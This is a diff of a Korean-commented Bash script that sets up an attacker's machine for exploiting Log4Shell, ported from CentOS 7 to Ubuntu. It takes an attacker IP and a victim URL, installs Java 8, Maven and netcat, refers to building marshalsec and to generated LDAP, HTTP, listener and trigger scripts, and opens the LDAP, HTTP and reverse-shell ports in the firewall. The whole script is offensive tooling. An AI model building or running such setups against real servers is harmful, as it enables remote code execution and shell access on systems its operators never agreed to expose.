@@ -1,5 +1,5 @@
 #!/bin/bash
-# Log4Shell 공격자 환경 세팅 스크립트 (CentOS 7)
+# Log4Shell 공격자 환경 세팅 스크립트 (Ubuntu)
 # 사용법: sudo ./setup.sh <공격자IP> <피해자URL>
 # 예시:   sudo ./setup.sh 192.168.1.100 http://192.168.1.200:8081/logs
 
@@ -23,7 +23,7 @@ if [ -z "$ATTACKER_IP" ]; then
     exit 1
 fi
 
-section "공격자 환경 설치 시작 (CentOS 7)"
+section "공격자 환경 설치 시작 (Ubuntu)"
 info "공격자 IP  : $ATTACKER_IP"
 info "피해자 URL : $VICTIM_URL"
 info "LDAP 포트  : $LDAP_PORT"
@@ -36,24 +36,21 @@ cd "$WORK_DIR"
 # ── 1. 의존성 설치 ───────────────────────────────────────────────────
 section "의존성 설치 (Java 8, Maven, git, python3, netcat)"
 
-# EPEL 저장소 활성화 (maven, python3 등에 필요)
-yum install -y epel-release 2>/dev/null
-
-yum install -y \
-    java-1.8.0-openjdk-devel \
+apt-get update -qq
+apt-get install -y -qq \
+    openjdk-8-jdk \
     maven \
     git \
     python3 \
-    nmap-ncat \
+    netcat-openbsd \
     curl \
     2>/dev/null
 
 info "Java 버전: $(java -version 2>&1 | head -1)"
 
 # Java 8을 기본으로 설정 (여러 버전 설치된 경우)
-JAVA8_PATH="$(alternatives --display java 2>/dev/null | grep 'jre-1.8.0-openjdk' | awk '{print $1}' | head -1)"
-if [ -n "$JAVA8_PATH" ]; then
-    alternatives --set java "$JAVA8_PATH" 2>/dev/null || true
+if update-java-alternatives -l 2>/dev/null | grep -q java-1.8; then
+    update-java-alternatives -s java-1.8.0-openjdk-amd64 2>/dev/null || true
 fi
 
 # ── 2. marshalsec 빌드 ──────────────────────────────────────────────
@@ -142,20 +139,15 @@ EOF
 
 chmod +x start_http.sh start_ldap.sh start_listener.sh trigger.sh
 
-# ── 5. firewalld 포트 오픈 ──────────────────────────────────────────
-section "방화벽 포트 오픈 (firewalld)"
+# ── 5. ufw 포트 오픈 ────────────────────────────────────────────────
+section "방화벽 포트 오픈 (ufw)"
 
-if systemctl is-active --quiet firewalld 2>/dev/null; then
-    firewall-cmd --permanent --add-port=${LDAP_PORT}/tcp 2>/dev/null && info "firewalld: ${LDAP_PORT}/tcp 오픈"
-    firewall-cmd --permanent --add-port=${HTTP_PORT}/tcp 2>/dev/null && info "firewalld: ${HTTP_PORT}/tcp 오픈"
-    firewall-cmd --permanent --add-port=${SHELL_PORT}/tcp 2>/dev/null && info "firewalld: ${SHELL_PORT}/tcp 오픈"
-    firewall-cmd --reload 2>/dev/null && info "firewalld 규칙 적용 완료"
-elif command -v iptables &>/dev/null; then
-    iptables -I INPUT -p tcp --dport ${LDAP_PORT} -j ACCEPT && info "iptables: ${LDAP_PORT} 오픈"
-    iptables -I INPUT -p tcp --dport ${HTTP_PORT} -j ACCEPT && info "iptables: ${HTTP_PORT} 오픈"
-    iptables -I INPUT -p tcp --dport ${SHELL_PORT} -j ACCEPT && info "iptables: ${SHELL_PORT} 오픈"
+if command -v ufw &>/dev/null && ufw status | grep -q "Status: active"; then
+    ufw allow ${LDAP_PORT}/tcp 2>/dev/null && info "ufw: ${LDAP_PORT} 오픈"
+    ufw allow ${HTTP_PORT}/tcp 2>/dev/null && info "ufw: ${HTTP_PORT} 오픈"
+    ufw allow ${SHELL_PORT}/tcp 2>/dev/null && info "ufw: ${SHELL_PORT} 오픈"
 else
-    warn "firewalld/iptables 미설치 — 방화벽 수동 확인 필요"
+    warn "ufw 비활성 또는 미설치 — 방화벽 수동 확인 필요"
 fi
 
 # ── 완료 ────────────────────────────────────────────────────────────
